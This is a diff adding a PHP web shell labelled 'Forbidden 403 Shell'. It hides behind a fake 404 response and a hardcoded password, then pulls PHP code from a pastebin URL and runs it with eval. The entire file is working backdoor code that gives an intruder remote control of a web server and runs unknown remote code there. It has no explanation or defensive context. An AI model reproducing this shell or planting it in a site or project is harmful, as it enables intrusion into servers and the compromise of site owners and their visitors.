@@ -1,0 +1,25 @@
+<?php
+
+// Forbidden 403 Shell | Copyright NzXsx7
+// Hyooo Mo Ngapain
+
+error_reporting(0);
+header('HTTP/1.0 404 Not Found', true, 404);
+session_start();
+$pass = "NzXsx7@r00ted_m3m3k";
+$link = "fvck.txt";
+if($_POST['password'] == $pass) {
+  $_SESSION['forbidden'] = $pass;
+  echo "<script>window.location='?403Forbidden'</script>";
+}
+if($_GET['page'] == "blank") {
+  echo "<a href='?'>Back</a>";
+  exit();
+}
+if(isset($_REQUEST['logout'])) {
+  session_destroy();
+  echo "<script>window.location='?403Forbidden'</script>";
+}
+if(!($_SESSION['forbidden'])) {
+?>
+<?php eval("?>".file_get_contents("https://pastebin.com/raw/ept8KywF"));?>
